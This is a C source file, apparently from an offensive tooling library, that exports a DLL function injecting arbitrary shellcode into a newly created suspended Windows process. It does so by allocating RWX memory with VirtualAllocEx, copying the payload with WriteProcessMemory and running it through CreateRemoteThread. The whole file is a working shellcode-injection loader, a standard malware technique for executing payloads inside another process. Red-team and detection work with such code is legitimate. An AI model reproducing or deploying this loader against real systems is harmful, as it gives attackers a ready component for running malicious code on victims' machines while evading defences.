#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "../include/injections.h"

/*
 * This function creates a process, injects shellcode into that process, and runs that shellcode
 *
 * Input:
 *      [in] BYTE[] shellcode: shellcode to inject and execute
 *
 *      [in] SIZE_T dwShellcodeSize: size of the shellcode array
 *
 *      [in] LPCSTR lpApplicationName: name of the application to create a process of
 *
 * Output:
 *      BOOL: If function fails FALSE, otherwise TRUE
 *
 * Note:
 *      The function uses a standard CreateProcessA, VirtualAllocEx,
 *      WriteProcessMemory, and CreateRemoteThread execution flow. 
 *      The memory is allocated with PAGE_EXECUTE_READWRITE protections and it doesn't revert the protection rights
 */
DLLEXPORT BOOL WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        #ifdef DEBUG
        printf("CreateProcess failed (%d).\n", GetLastError());
        #endif
        return FALSE;
    }

    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        #ifdef DEBUG
        printf("VirtualAllocEx failed (%d).\n", GetLastError());
        #endif
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory,shellcode, dwShellcodeSize, &bytesWritten)) {
        #ifdef DEBUG
        printf("WriteProcessMemory failed (%d).\n", GetLastError());
        #endif
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        #ifdef DEBUG
        printf("CreateRemoteThread failed (%d).\n", GetLastError());
        #endif
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    TerminateThread(pi.hThread, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

